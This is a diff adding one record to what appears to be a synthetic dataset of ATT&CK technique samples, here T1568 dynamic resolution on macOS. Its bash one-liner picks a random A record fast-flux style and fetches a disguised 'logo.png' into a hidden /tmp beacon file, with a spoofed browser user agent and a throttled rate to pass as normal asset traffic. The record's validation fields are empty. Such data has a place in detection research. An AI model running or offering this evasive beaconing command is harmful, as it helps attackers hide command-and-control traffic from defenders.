@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "domain=\"cms-assets-cdn.net\"; ip=$(dig +short A \"$domain\" | awk 'BEGIN{srand()}{a[NR]=$1} END{if(NR)print a[int(rand()*NR)+1]}'); ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; [ -n \"$ip\" ] && wget -q --header=\"Host: $domain\" --user-agent=\"$ua\" --header=\"Accept: image/png,image/*;q=0.8\" --limit-rate=40k --timeout=8 --tries=2 \"http://$ip/img/logo.png\" -O /tmp/.ff_beacon",
+  "explanation": "Implements fast-flux style dynamic resolution by randomly selecting an A record at runtime and contacting the IP directly with a Host header to maintain virtual hosting semantics.",
+  "rationale_steps": [
+    "Resolve multiple A records and randomly select one (fast flux).",
+    "Send HTTP GET to the chosen IP with Host header set to the domain.",
+    "Use image-like path and normal UA to masquerade as asset retrieval."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-c1e3087f",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
